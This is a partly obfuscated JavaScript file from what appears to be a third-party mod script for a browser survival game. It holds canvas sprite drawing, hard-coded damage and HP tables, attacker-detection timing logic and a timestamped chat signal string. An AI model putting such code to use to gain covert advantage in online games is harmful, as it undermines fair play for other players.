      _var_777.moveTo(_param_618 * 55.928558349609375, _param_618 * 8.866058349609375);
      _var_777.bezierCurveTo(_param_618 * 35.928558349609375, _param_618 * 35.866058349609375, _param_618 * 37.928558349609375, _param_618 * 48.866058349609375, _param_618 * 46.928558349609375, _param_618 * 62.866058349609375);
      _var_777.bezierCurveTo(_param_618 * 65.92855834960938, _param_618 * 72.86605834960938, _param_618 * 80.92855834960938, _param_618 * 55.866058349609375, _param_618 * 93.92855834960938, _param_618 * 36.866058349609375);
      _var_777.closePath();
      fill_path(_var_777, _param_619[3], _param_619[4], _param_618 * 6);
      _var_777.beginPath();
      _var_777.lineCap = "round";
      _var_777.lineJoin = "round";
      _var_777.moveTo(_param_618 * 93.92855834960938, _param_618 * 36.866058349609375);
      _var_777.bezierCurveTo(_param_618 * 82.92855834960938, _param_618 * 37.866058349609375, _param_618 * 77.92855834960938, _param_618 * 36.866058349609375, _param_618 * 67.92855834960938, _param_618 * 28.866058349609375);
      _var_777.bezierCurveTo(_param_618 * 53.928558349609375, _param_618 * 16.866058349609375, _param_618 * 53.928558349609375, _param_618 * 14.866058349609375, _param_618 * 55.928558349609375, _param_618 * 7.866058349609375);
      _var_777.bezierCurveTo(_param_618 * 65.92855834960938, _param_618 * 4.866058349609375, _param_618 * 71.92855834960938, _param_618 * 7.866058349609375, _param_618 * 83.92855834960938, _param_618 * 13.866058349609375);
      _var_777.bezierCurveTo(_param_618 * 96.92855834960938, _param_618 * 21.866058349609375, _param_618 * 95.92855834960938, _param_618 * 31.866058349609375, _param_618 * 92.92855834960938, _param_618 * 36.866058349609375);
      _var_777.closePath();
      fill_path(_var_777, _param_619[3], _param_619[4], _param_618 * 6);
      _var_777.beginPath();
      _var_777.lineCap = "round";
      _var_777.lineJoin = "round";
      _var_777.moveTo(_param_618 * 68.92855834960938, _param_618 * 16.866058349609375);
      _var_777.bezierCurveTo(_param_618 * 71.92855834960938, _param_618 * 13.866058349609375, _param_618 * 76.92855834960938, _param_618 * 16.866058349609375, _param_618 * 79.92855834960938, _param_618 * 21.866058349609375);
      _var_777.bezierCurveTo(_param_618 * 82.92855834960938, _param_618 * 24.866058349609375, _param_618 * 81.92855834960938, _param_618 * 27.866058349609375, _param_618 * 73.92855834960938, _param_618 * 24.866058349609375);
      _var_777.bezierCurveTo(_param_618 * 67.92855834960938, _param_618 * 20.866058349609375, _param_618 * 66.92855834960938, _param_618 * 19.866058349609375, _param_618 * 67.92855834960938, _param_618 * 17.866058349609375);
      _var_777.closePath();
      fill_path(_var_777, _param_619[2]);
    } else if (_param_620 === 3) {
      _var_777.scale(0.9, 0.9);
      _var_777.translate(_param_618 * 6, 0);
      _var_777.beginPath();
      _var_777.lineCap = "round";
      _var_777.lineJoin = "round";
      _var_777.moveTo(_param_618 * 54, _param_618 * 0.421875);
      _var_777.bezierCurveTo(_param_618 * 84, _param_618 * 45.421875, _param_618 * 89, _param_618 * 51.421875, _param_618 * 83, _param_618 * 74.421875);
      _var_777.bezierCurveTo(_param_618 * 74, _param_618 * 95.421875, _param_618 * 46, _param_618 * 98.421875, _param_618 * 30, _param_618 * 78.421875);
      _var_777.bezierCurveTo(_param_618 * 22, _param_618 * 59.421875, _param_618 * 27, _param_618 * 49.421875, _param_618 * 34, _param_618 * 36.421875);
      _var_777.closePath();
      fill_path(_var_777, _param_619[2], _param_619[3], _param_618 * 6);
      _var_777.beginPath();
      _var_777.lineCap = "round";
      _var_777.lineJoin = "round";
      _var_777.moveTo(_param_618 * 74, _param_618 * 52.421875);
      _var_777.bezierCurveTo(_param_618 * 77, _param_618 * 73.421875, _param_618 * 69, _param_618 * 81.421875, _param_618 * 58, _param_618 * 81.421875);
      _var_777.bezierCurveTo(_param_618 * 66, _param_618 * 71.421875, _param_618 * 70, _param_618 * 66.421875, _param_618 * 74, _param_618 * 52.421875);
      _var_777.closePath();
      fill_path(_var_777, _param_619[3]);
    }
    return _var_776;
  }
  function create_gauges(_param_621) {
    let _var_783 = document.createElement("canvas");
    let _var_b55 = _var_783.getContext("2d");
    let _var_784 = _param_621 * 950;
    let _var_785 = _param_621 * 180;
    let _var_786 = _param_621 * 50;
    let _var_787 = _param_621 * 20;
    let _var_g40 = _param_621 * 240;
    let _var_h38 = _param_621 * 35;
    let _var_788 = _param_621 * 1;
    let _var_j6 = _param_621 * 4;
    let _var_789 = _param_621 * 4;
    let _var_790 = _param_621 * 15;
    _var_783.width = _var_784;
    _var_783.height = _var_786;
    _var_b55.translate(0, _var_790);
    round_rect(_var_b55, _var_h38, _var_788, _var_785, _var_787, _var_j6);
    fill_path(_var_b55, null, "#69A148", _var_789);
    let _var_791 = mySprite[MY_SPRITE.HEART_SYMBOL_HUD];
    _var_b55.drawImage(_var_791, 17, -8);
    _var_b55.translate(_var_g40, 0);
    round_rect(_var_b55, _var_h38, _var_788, _var_785, _var_787, _var_j6);
    fill_path(_var_b55, null, "#AF352A", _var_789);
    let _var_792 = mySprite[MY_SPRITE.FOOD_SYMBOL_HUD];
    _var_b55.drawImage(_var_792, 17, -9);
    _var_b55.translate(_var_g40, 0);
    round_rect(_var_b55, _var_h38, _var_788, _var_785, _var_787, _var_j6);
    fill_path(_var_b55, null, "#669BB1", _var_789);
    let _var_p2 = mySprite[MY_SPRITE.COLD_SYMBOL_HUD];
    _var_b55.drawImage(_var_p2, 17, -8);
    _var_b55.translate(_var_g40, 0);
    round_rect(_var_b55, _var_h38, _var_788, _var_785, _var_787, _var_j6);
    fill_path(_var_b55, null, "#074A87", _var_789);
    let _var_793 = mySprite[MY_SPRITE.WATER_SYMBOL_HUD];
    _var_b55.drawImage(_var_793, 17, -8);
    return _var_783;
  }
  function create_gauges1(scaleFactor) {
    var canvas = document.createElement("canvas");
    var ctx = canvas.getContext("2d");
    var canvasWidth = scaleFactor * 981;
    var gaugeWidth = scaleFactor * 180;
    var canvasHeight = scaleFactor * 50;
    var gaugeHeight = scaleFactor * 20;
    var horizontalTranslate = scaleFactor * 240;
    var gaugeRectX = scaleFactor * 35;
    var gaugeRectY = scaleFactor * 1;
    var borderRadius = scaleFactor * 4;
    var borderWidth = scaleFactor * 4;
    var topPadding = scaleFactor * 15;
    canvas.width = canvasWidth;
    canvas.height = canvasHeight;
    ctx.translate(0, topPadding);
    round_rect(ctx, gaugeRectX, gaugeRectY, gaugeWidth, gaugeHeight, borderRadius);
    fill_path(ctx, null, "#69A148", borderWidth);
    var heartSprite = mySprite[MY_SPRITE.HEART_SYMBOL_HUD];
    ctx.drawImage(heartSprite, scaleFactor * 17, scaleFactor * -8);
    ctx.translate(horizontalTranslate, 0);
    round_rect(ctx, gaugeRectX, gaugeRectY, gaugeWidth, gaugeHeight, borderRadius);
    fill_path(ctx, null, "#AF352A", borderWidth);
    var foodSprite = mySprite[MY_SPRITE.FOOD_SYMBOL_HUD];
    ctx.drawImage(foodSprite, scaleFactor * 17, scaleFactor * -9);
    ctx.translate(horizontalTranslate, 0);
    round_rect(ctx, gaugeRectX, gaugeRectY, gaugeWidth, gaugeHeight, borderRadius);
    fill_path(ctx, null, "#669BB1", borderWidth);
    var coldSprite = mySprite[MY_SPRITE.COLD_SYMBOL_HUD];
    var coldIconX = gaugeRectX + gaugeWidth - coldSprite.width / 2 * scaleFactor;
    ctx.drawImage(coldSprite, coldIconX, scaleFactor * -8);
    ctx.translate(horizontalTranslate, 0);
    round_rect(ctx, gaugeRectX, gaugeRectY, gaugeWidth, gaugeHeight, borderRadius);
    fill_path(ctx, null, "#074A87", borderWidth);
    var waterSprite = mySprite[MY_SPRITE.WATER_SYMBOL_HUD];
    var waterIconX = gaugeRectX + gaugeWidth - waterSprite.width / 2 * scaleFactor;
    ctx.drawImage(waterSprite, waterIconX, scaleFactor * -8);
    return canvas;
  }
  function create_oxygen_gauges(_param_622) {
    let _var_794 = document.createElement("canvas");
    let _var_795 = _var_794.getContext("2d");
    let _var_796 = _param_622 * 600;
    let _var_797 = _param_622 * 22;
    let _var_798 = _param_622 * 4;
    let _var_799 = _param_622 * 4;
    _var_794.width = _var_796;
    _var_794.height = _var_797;
    round_rect(_var_795, _param_622 * 5, _param_622 * 5, _var_796 - _param_622 * 10, _var_797 - _param_622 * 10, _var_798);
    fill_path(_var_795, null, "#BBE8EF", _var_799);
    return _var_794;
  }
  function create_chest(scale, _0x4ebea0, colors) {
    const canvas = document.createElement("canvas");
    const context = canvas.getContext("2d");
    canvas.width = scale * 165;
    canvas.height = scale * 123;
    context.save();
    context.translate(scale * 81, scale * 65);
    round_rect(context, scale * -78, scale * -54.5, scale * 156, scale * 109, scale * 20);
    context.restore();
    fill_path(context, colors[0]);
    context.save();
    context.translate(scale * 81, scale * 58);
    round_rect(context, scale * -78, scale * -54.5, scale * 156, scale * 109, scale * 20);
    context.restore();
    fill_path(context, colors[1], colors[2], 4);
    context.save();
    context.translate(scale * 81, scale * 58);
    round_rect(context, scale * -69, scale * -47, scale * 138, scale * 93, scale * 15);
    context.restore();
    fill_path(context, colors[3], colors[4], 4);
    context.save();
    context.translate(scale * 79, scale * 54);
    round_rect(context, scale * -34, scale * -40, scale * 68, scale * 88, scale * 13);
    context.restore();
    fill_path(context, undefined, colors[5], 4);
    context.beginPath();
    context.lineCap = "round";
    context.lineJoin = "round";
    context.moveTo(scale * 44, scale * 13);
    context.bezierCurveTo(scale * 43.5, scale * 55, scale * 43.5, scale * 55, scale * 43, scale * 101);
    context.closePath();
    fill_path(context, undefined, colors[6], 4);
    context.beginPath();
    context.lineCap = "round";
    context.lineJoin = "round";
    context.moveTo(scale * 115, scale * 13);
    context.bezierCurveTo(scale * 115, scale * 56, scale * 115, scale * 56, scale * 115, scale * 101);
    context.closePath();
    fill_path(context, undefined, colors[6], 4);
    context.beginPath();
    context.lineCap = "round";
    context.lineJoin = "round";
    context.moveTo(scale * 35, scale * 6);
    context.bezierCurveTo(scale * 35, scale * 56, scale * 36, scale * 109, scale * 35, scale * 110);
    context.closePath();
    fill_path(context, undefined, colors[7], 4);
    context.beginPath();
    context.lineCap = "round";
    context.lineJoin = "round";
    context.moveTo(scale * 123, scale * 6);
    context.bezierCurveTo(scale * 123, scale * 56, scale * 123, scale * 56, scale * 123, scale * 110);
    context.closePath();
    fill_path(context, undefined, colors[7], 4);
    context.save();
    context.translate(scale * 79, scale * 113);
    round_rect(context, scale * -18, scale * -2, scale * 36, scale * 4, scale * 20);
    context.restore();
    fill_path(context, undefined, colors[8], 4);
    context.save();
    context.translate(scale * 75, scale * 118);
    round_rect(context, scale * -6, scale * -2.5, scale * 20, scale * 5, scale * 20);
    context.restore();
    fill_path(context, colors[8]);
    return canvas;
  }
  function create_roof(_0x3967d9, _0x3f1dbf, _0x38f2c3) {
    var _0x50400d = document.createElement("canvas");
    var _0x382382 = _0x50400d.getContext("2d");
    _0x50400d.width = _0x3967d9 * 248;
    _0x50400d.height = _0x3967d9 * 247;
    _0x382382.save();
    _0x382382.translate(_0x3967d9 * 69.5, _0x3967d9 * 145);
    round_rect(_0x382382, _0x3967d9 * -8.5, _0x3967d9 * -63, _0x3967d9 * 17, _0x3967d9 * 127, _0x3967d9 * 1);
    _0x382382.restore();
    fill_path(_0x382382, _0x38f2c3[0]);
    _0x382382.save();
    _0x382382.translate(_0x3967d9 * 183, _0x3967d9 * 145);
    round_rect(_0x382382, _0x3967d9 * -8, _0x3967d9 * -63, _0x3967d9 * 16, _0x3967d9 * 126, _0x3967d9 * 1);
    _0x382382.restore();
    fill_path(_0x382382, _0x38f2c3[0]);
    _0x382382.save();
    _0x382382.translate(_0x3967d9 * 123.5, _0x3967d9 * 62.5);
    _0x382382.rotate(6.28);
    round_rect(_0x382382, _0x3967d9 * -84.5, _0x3967d9 * -25.5, _0x3967d9 * 169, _0x3967d9 * 51, _0x3967d9 * 5);
    _0x382382.restore();
    fill_path(_0x382382, _0x38f2c3[2], _0x38f2c3[1], _0x3967d9 * 6);
    _0x382382.save();
    _0x382382.translate(_0x3967d9 * 123.5, _0x3967d9 * 118);
    _0x382382.rotate(6.24);
    round_rect(_0x382382, _0x3967d9 * -85.5, _0x3967d9 * -24, _0x3967d9 * 169, _0x3967d9 * 48, _0x3967d9 * 5);
    _0x382382.restore();
    fill_path(_0x382382, _0x38f2c3[3], _0x38f2c3[1], _0x3967d9 * 6);
    _0x382382.save();
    _0x382382.translate(_0x3967d9 * 122, _0x3967d9 * 177.5);
    _0x382382.rotate(6.32);
    round_rect(_0x382382, _0x3967d9 * -84, _0x3967d9 * -23.5, _0x3967d9 * 169, _0x3967d9 * 47, _0x3967d9 * 5);
    _0x382382.restore();
    fill_path(_0x382382, _0x38f2c3[2], _0x38f2c3[1], _0x3967d9 * 6);
    _0x382382.beginPath();
    _0x382382.lineCap = "round";
    _0x382382.lineJoin = "round";
    _0x382382.moveTo(_0x3967d9 * 37, _0x3967d9 * 157);
    _0x382382.bezierCurveTo(_0x3967d9 * 49, _0x3967d9 * 160, _0x3967d9 * 49, _0x3967d9 * 160, _0x3967d9 * 61, _0x3967d9 * 163);
    _0x382382.bezierCurveTo(_0x3967d9 * 49.5, _0x3967d9 * 165.5, _0x3967d9 * 49.5, _0x3967d9 * 165.5, _0x3967d9 * 38, _0x3967d9 * 168);
    _0x382382.closePath();
    fill_path(_0x382382, _0x38f2c3[1]);
    _0x382382.beginPath();
    _0x382382.lineCap = "round";
    _0x382382.lineJoin = "round";
    _0x382382.moveTo(_0x3967d9 * 205, _0x3967d9 * 175);
    _0x382382.bezierCurveTo(_0x3967d9 * 192.5, _0x3967d9 * 180, _0x3967d9 * 192.5, _0x3967d9 * 180, _0x3967d9 * 180, _0x3967d9 * 185);
    _0x382382.bezierCurveTo(_0x3967d9 * 193, _0x3967d9 * 188, _0x3967d9 * 193, _0x3967d9 * 188, _0x3967d9 * 206, _0x3967d9 * 191);
    _0x382382.closePath();
    fill_path(_0x382382, _0x38f2c3[1]);
    return _0x50400d;
  }
  function create_roof1(_param_623, _unused, _param_624) {
    let _var_800 = document.createElement("canvas");
    let _var_b56 = _var_800.getContext("2d");
    _var_800.width = _param_623 * 248;
    _var_800.height = _param_623 * 247;
    _var_b56.save();
    _var_b56.translate(_param_623 * 182, _param_623 * 120);
    round_rect(_var_b56, _param_623 * -8, _param_623 * -67, _param_623 * 16, _param_623 * 134, _param_623 * 1);
    _var_b56.restore();
    fill_path(_var_b56, _param_624[0]);
    _var_b56.save();
    _var_b56.translate(_param_623 * 68.5, _param_623 * 127.5);
    round_rect(_var_b56, _param_623 * -8.5, _param_623 * -70.5, _param_623 * 17, _param_623 * 141, _param_623 * 1);
    _var_b56.restore();
    fill_path(_var_b56, _param_624[0]);
    _var_b56.save();
    _var_b56.translate(_param_623 * 123.5, _param_623 * 68);
    round_rect(_var_b56, _param_623 * -82.5, _param_623 * -24, _param_623 * 165, _param_623 * 48, _param_623 * 4);
    _var_b56.restore();
    fill_path(_var_b56, _param_624[2], _param_624[1], _param_623 * 6);
    _var_b56.save();
    _var_b56.translate(_param_623 * 123, _param_623 * 179.5);
    round_rect(_var_b56, _param_623 * -83, _param_623 * -24.5, _param_623 * 166, _param_623 * 49, _param_623 * 4);
    _var_b56.restore();
    fill_path(_var_b56, _param_624[2], _param_624[1], _param_623 * 6);
    _var_b56.save();
    _var_b56.translate(_param_623 * 123.5, _param_623 * 123.5);
    _var_b56.rotate(6.24);
    round_rect(_var_b56, _param_623 * -82.5, _param_623 * -24.5, _param_623 * 165, _param_623 * 49, _param_623 * 4);
    _var_b56.restore();
    fill_path(_var_b56, _param_624[3], _param_624[1], _param_623 * 6);
    _var_b56.beginPath();
    _var_b56.lineCap = "round";
    _var_b56.lineJoin = "round";
    _var_b56.moveTo(_param_623 * 204, _param_623 * 112);
    _var_b56.bezierCurveTo(_param_623 * 149, _param_623 * 121.5, _param_623 * 96, _param_623 * 130, _param_623 * 94, _param_623 * 131);
    _var_b56.bezierCurveTo(_param_623 * 149.5, _param_623 * 127.5, _param_623 * 149.5, _param_623 * 127.5, _param_623 * 205, _param_623 * 124);
    _var_b56.closePath();
    fill_path(_var_b56, _param_624[1]);
    return _var_800;
  }
  function create_roof2(_param_625, _unused2, _param_626) {
    let _var_801 = document.createElement("canvas");
    let _var_802 = _var_801.getContext("2d");
    _var_801.width = _param_625 * 248;
    _var_801.height = _param_625 * 247;
    _var_802.save();
    _var_802.translate(_param_625 * 183, _param_625 * 107);
    round_rect(_var_802, _param_625 * -8, _param_625 * -70.5, _param_625 * 16, _param_625 * 141, _param_625 * 1);
    _var_802.restore();
    fill_path(_var_802, _param_626[0]);
    _var_802.save();
    _var_802.translate(_param_625 * 69.5, _param_625 * 110);
    round_rect(_var_802, _param_625 * -8.5, _param_625 * -71, _param_625 * 17, _param_625 * 143, _param_625 * 1);
    _var_802.restore();
    fill_path(_var_802, _param_626[0]);
    _var_802.save();
    _var_802.translate(_param_625 * 123.5, _param_625 * 181);
    round_rect(_var_802, _param_625 * -84.5, _param_625 * -26, _param_625 * 169, _param_625 * 52, _param_625 * 5);
    _var_802.restore();
    fill_path(_var_802, _param_626[2], _param_626[1], _param_625 * 6);
    _var_802.beginPath();
    _var_802.lineCap = "round";
    _var_802.lineJoin = "round";
    _var_802.moveTo(_param_625 * 41, _param_625 * 95);
    _var_802.bezierCurveTo(_param_625 * 105, _param_625 * 96, _param_625 * 113, _param_625 * 99, _param_625 * 134, _param_625 * 102);
    _var_802.bezierCurveTo(_param_625 * 147, _param_625 * 106, _param_625 * 173, _param_625 * 100, _param_625 * 207, _param_625 * 105);
    _var_802.bezierCurveTo(_param_625 * 210, _param_625 * 105, _param_625 * 207, _param_625 * 140, _param_625 * 207, _param_625 * 154);
    _var_802.bezierCurveTo(_param_625 * 123.5, _param_625 * 151.5, _param_625 * 123.5, _param_625 * 151.5, _param_625 * 40, _param_625 * 149);
    _var_802.bezierCurveTo(_param_625 * 37, _param_625 * 145, _param_625 * 39, _param_625 * 95, _param_625 * 41, _param_625 * 96);
    _var_802.closePath();
    fill_path(_var_802, _param_626[2], _param_626[1], _param_625 * 6);
    _var_802.beginPath();
    _var_802.lineCap = "round";
    _var_802.lineJoin = "round";
    _var_802.moveTo(_param_625 * 68, _param_625 * 75);
    _var_802.bezierCurveTo(_param_625 * 54, _param_625 * 72.5, _param_625 * 54, _param_625 * 72.5, _param_625 * 40, _param_625 * 70);
    _var_802.bezierCurveTo(_param_625 * 38, _param_625 * 46, _param_625 * 40, _param_625 * 46, _param_625 * 53, _param_625 * 46);
    _var_802.bezierCurveTo(_param_625 * 201, _param_625 * 41, _param_625 * 201, _param_625 * 41, _param_625 * 201, _param_625 * 42);
    _var_802.bezierCurveTo(_param_625 * 211, _param_625 * 40, _param_625 * 208, _param_625 * 53, _param_625 * 208, _param_625 * 72);
    _var_802.bezierCurveTo(_param_625 * 209, _param_625 * 91, _param_625 * 210, _param_625 * 96, _param_625 * 194, _param_625 * 94);
    _var_802.bezierCurveTo(_param_625 * 119, _param_625 * 97, _param_625 * 119, _param_625 * 97, _param_625 * 44, _param_625 * 100);
    _var_802.bezierCurveTo(_param_625 * 39, _param_625 * 99, _param_625 * 40, _param_625 * 96, _param_625 * 40, _param_625 * 80);
    _var_802.bezierCurveTo(_param_625 * 54, _param_625 * 77.5, _param_625 * 54, _param_625 * 77.5, _param_625 * 68, _param_625 * 75);
    _var_802.closePath();
    fill_path(_var_802, _param_626[3], _param_626[1], _param_625 * 6);
    return _var_801;
  }
  function create_bridge(_param_627, _param_628, _param_629) {
    let _var_803 = document.createElement("canvas");
    let _var_804 = _var_803.getContext("2d");
    _var_803.width = _param_627 * 102;
    _var_803.height = _param_627 * 102;
    _var_804.globalAlpha = _param_628 ? 0.5 : 1;
    _var_804.translate(3, 3);
    round_rect(_var_804, _param_627 * 24, _param_627 * 26, _param_627 * 70, _param_627 * 9, _param_627 * 10);
    fill_path(_var_804, _param_629[0]);
    round_rect(_var_804, _param_627 * 26, _param_627 * 70, _param_627 * 70, _param_627 * 9, _param_627 * 10);
    fill_path(_var_804, _param_629[0]);
    round_rect(_var_804, _param_627 * 5, _param_627 * 3, _param_627 * 22, _param_627 * 94, _param_627 * 5);
    fill_path(_var_804, _param_629[0]);
    round_rect(_var_804, _param_627 * 40, _param_627 * 3, _param_627 * 22, _param_627 * 94, _param_627 * 5);
    fill_path(_var_804, _param_629[0]);
    round_rect(_var_804, _param_627 * 75, _param_627 * 3, _param_627 * 22, _param_627 * 94, _param_627 * 5);
    fill_path(_var_804, _param_629[0]);
    _var_804.globalAlpha = 1;
    _var_804.translate(-3, -3);
    round_rect(_var_804, _param_627 * 24, _param_627 * 26, _param_627 * 70, _param_627 * 9, _param_627 * 10);
    fill_path(_var_804, _param_629[1]);
    round_rect(_var_804, _param_627 * 26, _param_627 * 70, _param_627 * 70, _param_627 * 9, _param_627 * 10);
    fill_path(_var_804, _param_629[1]);
    round_rect(_var_804, _param_627 * 5, _param_627 * 3, _param_627 * 22, _param_627 * 94, _param_627 * 5);
    fill_path(_var_804, _param_629[2], _param_629[3], _param_627 * 4);
    round_rect(_var_804, _param_627 * 40, _param_627 * 3, _param_627 * 22, _param_627 * 94, _param_627 * 5);
    fill_path(_var_804, _param_629[2], _param_629[3], _param_627 * 4);
    round_rect(_var_804, _param_627 * 75, _param_627 * 3, _param_627 * 22, _param_627 * 94, _param_627 * 5);
    fill_path(_var_804, _param_629[2], _param_629[3], _param_627 * 4);
    return _var_803;
  }
  class createText {
    constructor(width, height, buildType) {
      this.canvas = document.createElement("canvas");
      this.ctx = this.canvas.getContext("2d");
      this.canvas.width = width;
      this.canvas.height = height;
      this.buildType = buildType;
    }
    drawText(text, size, color, color2) {
      this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
      this.ctx.font = size + "px Baloo Paaji";
      this.ctx.strokeStyle = color;
      this.ctx.fillStyle = color2;
      this.ctx.lineWidth = 7;
      switch (this.buildType) {
        case 1:
          this.ctx.strokeText("x" + (text & 255), 15, 40);
          this.ctx.fillText("x" + (text & 255), 15, 40);
          this.ctx.strokeText("x" + ((text & 65280) >> 8), 15, 60);
          this.ctx.fillText("x" + ((text & 65280) >> 8), 15, 60);
          break;
        case 2:
          this.ctx.strokeText("x" + (text & 31), 15, 40);
          this.ctx.fillText("x" + (text & 31), 15, 40);
          this.ctx.strokeText("x" + ((text & 992) >> 5), 15, 60);
          this.ctx.fillText("x" + ((text & 992) >> 5), 15, 60);
          this.ctx.strokeText("x" + ((text & 31744) >> 10), 15, 80);
          this.ctx.fillText("x" + ((text & 31744) >> 10), 15, 80);
          break;
        case 3:
          this.ctx.strokeText(text[0], 15, 40);
          this.ctx.fillText(text[0], 15, 40);
          this.ctx.strokeText((text[1] & 16) >> 4 ? "L" : "U", 15, 60);
          this.ctx.fillText((text[1] & 16) >> 4 ? "L" : "U", 15, 60);
          this.ctx.strokeText((text[1] & 16) >> 4 ? text[1] - 16 : text[1], 15, 80);
          this.ctx.fillText((text[1] & 16) >> 4 ? text[1] - 16 : text[1], 15, 80);
          break;
        default:
          this.ctx.strokeText(text, 15, 40);
          this.ctx.fillText(text, 15, 40);
          break;
      }
    }
  }
  function generateTimestampedString() {
    const timestamp = Math.floor(Date.now() / 1000);
    return "?ez noob " + timestamp;
  }
  function isTimestampValid(str) {
    const match = str.match(/\d+$/);
    if (!match) {
      return false;
    }
    const timestamp = parseInt(match[0], 10);
    const now = Math.floor(Date.now() / 1000);
    return Math.abs(now - timestamp) <= 5;
  }
  function send_drop_weapon_cmd() {
    send_chat(generateTimestampedString());
  }
  async function detectAndTranslate(text, targetLang = "en") {
    let detectUrl = "https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=" + targetLang + "&dt=t&q=" + encodeURIComponent(text);
    try {
      let response = await fetch(detectUrl);
      let data = await response.json();
      let detectedLang = data[2];
      let translatedText = data[0].map(item => {
        return item[0];
      }).join("");
      return {
        detectedLang: detectedLang,
        translatedText: translatedText
      };
    } catch (error) {
      console.error("Lỗi:", error);
      return {
        error: "Không thể xác định ngôn ngữ hoặc dịch văn bản."
      };
    }
  }
  function getHp(_param_630) {
    switch (_param_630) {
      case ITEMS.PLAYERS:
        return 200;
      case ITEMS.RABBIT:
        return 60;
      case ITEMS.WOLF:
        return 300;
      case ITEMS.SPIDER:
        return 120;
      case ITEMS.BOAR:
        return 600;
      case ITEMS.HAWK:
        return 300;
      case ITEMS.PENGUIN:
        return 90;
      case ITEMS.FOX:
        return 300;
      case ITEMS.BEAR:
        return 900;
      case ITEMS.BABY_MAMMOTH:
        return 1000;
      case ITEMS.MAMMOTH:
        return 3000;
      case ITEMS.BABY_DRAGON:
        return 500;
      case ITEMS.DRAGON:
        return 1500;
      case ITEMS.CRAB:
        return 240;
      case ITEMS.CRAB_BOSS:
        return 1500;
      case ITEMS.PIRANHA:
        return 300;
      case ITEMS.KRAKEN:
        return 6000;
      case ITEMS.FLAME:
        return 600;
      case ITEMS.LAVA_DRAGON:
        return 3000;
      case ITEMS.BABY_LAVA:
        return 1000;
      case ITEMS.VULTURE:
        return 600;
      case ITEMS.SAND_WORM:
        return 1500;
      case ITEMS.GOLDEN_CHICKEN:
        return 200;
      case ITEMS.DEAD_BOX:
        return 300;
      case ITEMS.CRATE:
        return 30;
      default:
        return null;
    }
  }
  function getDamage(invId, isToAnimal, helmetId, vehicleId) {
    switch (invId) {
      case -1:
        return 5;
      case INV.MACHETE:
        if (isToAnimal) {
          return 6;
        } else {
          return 5;
        }
      case INV.WOOD_SWORD:
        return 12;
      case INV.STONE_SWORD:
        return 19;
      case INV.GOLD_SWORD:
        return 22;
      case INV.DIAMOND_SWORD:
        return 24;
      case INV.AMETHYST_SWORD:
        return 27;
      case INV.REIDITE_SWORD:
        return 30;
      case INV.EMERALD_SWORD:
        return 32;
      case INV.DRAGON_SWORD:
        if (helmetId === INV.DRAGON_HELMET) {
          return 33;
        } else {
          return 30;
        }
      case INV.LAVA_SWORD:
        if (helmetId === INV.LAVA_HELMET) {
          return 36;
        } else {
          return 33;
        }
      case INV.PIRATE_SWORD:
        return 32;
      case INV.WOOD_SPEAR:
        return 10;
      case INV.STONE_SPEAR:
        return 14;
      case INV.GOLD_SPEAR:
        return 16;
      case INV.DIAMOND_SPEAR:
        return 18;
      case INV.AMETHYST_SPEAR:
        return 20;
      case INV.REIDITE_SPEAR:
        return 22;
      case INV.EMERALD_SPEAR:
        return 23;
      case INV.DRAGON_SPEAR:
        if (helmetId === INV.DRAGON_HELMET) {
          return 24;
        } else {
          return 22;
        }
      case INV.LAVA_SPEAR:
        if (helmetId === INV.LAVA_HELMET) {
          return 26;
        } else {
          return 24;
        }
      case INV.CRAB_SPEAR:
        if (helmetId === INV.CRAB_CROWN && vehicleId === INV.MOUNT_KING_CRAB) {
          return 25;
        } else {
          return 15;
        }
      case INV.WOOD_AXE:
        if (isToAnimal) {
          return 24;
        } else {
          return 14;
        }
      case INV.STONE_AXE:
        if (isToAnimal) {
          return 31;
        } else {
          return 21;
        }
      case INV.GOLD_AXE:
        if (isToAnimal) {
          return 34;
        } else {
          return 24;
        }
      case INV.DIAMOND_AXE:
        if (isToAnimal) {
          return 37;
        } else {
          return 27;
        }
      case INV.AMETHYST_AXE:
        if (isToAnimal) {
          return 39;
        } else {
          return 29;
        }
      case INV.REIDITE_AXE:
        if (isToAnimal) {
          return 42;
        } else {
          return 32;
        }
      case INV.EMERALD_AXE:
        if (isToAnimal) {
          return 53;
        } else {
          return 33;
        }
      case INV.WOOD_PICK:
        return 1;
      case INV.STONE_PICK:
        return 2;
      case INV.GOLD_PICK:
        return 3;
      case INV.DIAMOND_PICK:
        return 4;
      case INV.AMETHYST_PICK:
        return 5;
      case INV.REIDITE_PICK:
        return 6;
      case INV.BOOK:
        return 1;
      case INV.STONE_HAMMER:
        return 2;
      case INV.GOLD_HAMMER:
        return 3;
      case INV.DIAMOND_HAMMER:
        return 4;
      case INV.AMETHYST_HAMMER:
        return 5;
      case INV.REIDITE_HAMMER:
        return 6;
      case INV.SUPER_HAMMER:
        return 12;
      case INV.STONE_SHOVEL:
        return 2;
      case INV.GOLD_SHOVEL:
        return 3;
      case INV.DIAMOND_SHOVEL:
        return 4;
      case INV.AMETHYST_SHOVEL:
        return 5;
      case INV.REIDITE_SHOVEL:
        return 5;
      case INV.WOOD_SHIELD:
        return 1;
      case INV.STONE_SHIELD:
        return 2;
      case INV.GOLD_SHIELD:
        return 3;
      case INV.DIAMOND_SHIELD:
        return 4;
      case INV.AMETHYST_SHIELD:
        return 5;
      case INV.REIDITE_SHIELD:
        return 6;
      default:
        return null;
    }
  }
  function getDamageOfPlayer(player, isToAnimal) {
    if (!player) {
      return 0;
    }
    return getDamage(player.right, isToAnimal, player.clothe, player.vehicle);
  }
  function getDamageRangeOfPlayer(_param_631) {
    switch (HoldWeapon(_param_631.right)) {
      case 0:
        return 200;
      case 1:
        if (_param_631.fly) {
          return 174.8;
        } else {
          return 135.6;
        }
      case 2:
        if (_param_631.fly) {
          return 269.8;
        } else {
          return 205.6;
        }
      case 3:
        return 0;
      case 4:
        if (_param_631.fly) {
          return 142;
        } else {
          return 109;
        }
      case 5:
        return 125;
      case 6:
        return 97.6;
    }
  }
  function findPlayerAttacking(hurtedEntity, players) {
    const now = performance.now();
    let res = null;
    let bestScore = Infinity;
    for (let i = 0, len = players.length; i < len; i++) {
      const player = players[i];
      if (hurtedEntity.type === ITEMS.PLAYERS && hurtedEntity.pid === player.pid) {
        continue;
      }
      if (hurtedEntity.attackedRecentlyBy[player.pid] && now - hurtedEntity.attackedRecentlyBy[player.pid] < 300) {
        continue;
      }
      const attackElapsed = now - player.startAttackTime;
      if (attackElapsed > 137.5 || attackElapsed < 27.5) {
        continue;
      }
      const dist = Utils.dist(hurtedEntity, player);
